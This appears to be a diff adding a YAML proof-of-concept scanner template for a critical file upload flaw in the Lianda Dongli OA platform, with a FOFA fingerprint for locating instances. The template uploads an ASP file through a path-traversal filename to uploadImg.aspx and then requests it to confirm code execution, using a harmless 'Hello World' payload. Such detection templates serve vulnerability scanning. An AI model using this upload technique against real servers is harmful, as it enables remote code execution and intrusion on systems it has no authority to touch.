@@ -1,0 +1,47 @@
+id: poc-yaml-lkpower-uploadImg-upload
+info:
+  name: 联达动力OA uploadImg 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 联达动力协同办公管理平台
+  fofa: body="/LKSys_WindowControlScript.js"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /Dept_Portal/uploadImg.aspx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW9xVaF04jQnVgkEA
+  data: '------WebKitFormBoundaryW9xVaF04jQnVgkEA
+
+    Content-Disposition: form-data; name="DesignId"
+
+
+    1
+
+    ------WebKitFormBoundaryW9xVaF04jQnVgkEA
+
+    Content-Disposition: form-data; name="Filedata"; filename="../../../../{{.filename}}.asp"
+
+    Content-Type: image/png
+
+
+    <% Response.Write("Hello World") %>
+
+    ------WebKitFormBoundaryW9xVaF04jQnVgkEA--
+
+    '
+  expression: 'status_code == 500 &&
+
+    contains(headers,"ASP.NET")
+
+    '
+- method: GET
+  path: /{{.filename}}.asp
+  expression: 'status_code == 200 &&
+
+    body == "Hello World"
+
+    '
+transport: http
